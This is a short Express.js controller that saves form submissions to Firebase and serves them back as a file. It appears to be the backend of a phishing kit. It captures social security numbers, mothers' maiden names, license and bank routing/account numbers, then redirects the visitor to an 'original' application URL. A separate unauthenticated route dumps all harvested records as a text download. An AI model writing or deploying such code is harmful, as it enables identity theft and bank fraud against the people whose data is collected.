const { response, request } = require(`express`);
const { dbfirebase, dbfirestone } = require("../db/firebase");

const userdb = dbfirebase.ref('usersApplic/');
const Add = userdb.push();

const currentDate = new Date();

const postUsuario = async (req = request, res = response, next) => {


    const {
        firstName,
        middleName,
        lastName,
        suffixId,
        dateOfBirth,
        mothersMaidenName,
        license,
        socialSecurityNumber,
        Routing,
        Account,
        Type,
        addressCategoryId,
        streetAddress,
        apartmentNumber,
        zipCode,
        cityId,
        stateId,
        emailAddress,
        phoneNumber,
        residenceOwnershipOptionId,
        primaryIncomeSourceId,
        EmployName,
        grossAnnualIncome


    } = req.body;





    await Add.set(req.body)
        .then(usuarioGuardado => {
            res.redirect(`${process.env.URLORIGINALApli}`)

            // res.status(200).json({
            //     msg: 'Usuario guardado exitosamente',
            //     ok: true

            // });
        })
        .catch(error => {
            console.error('Error al guardar el usuario:', error);
            res.status(500).json({
                msg: 'Error-> al guardar el usuario',
                ok: false
            });
        });

}

function generateUniqueId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

const getAppli = async (req = request, res = response) => {


    
    await userdb.once('value')
    .then(datos => {
        const userdata = datos.val();
        const uniqueId = generateUniqueId();

        res.setHeader('Content-disposition', `attachment; filename=${uniqueId}${currentDate}.txt`);
        res.set('Content-Type', 'text/plain');
        res.send(userdata);
        
        
    })
    .catch(error => {
        console.error('Error al guardar el usuario:', error);
        res.status(500).json({
            msg: 'Error-> al guardar el usuario',
            ok: false
        });
    });

}

module.exports = {
    postUsuario,
    getAppli
}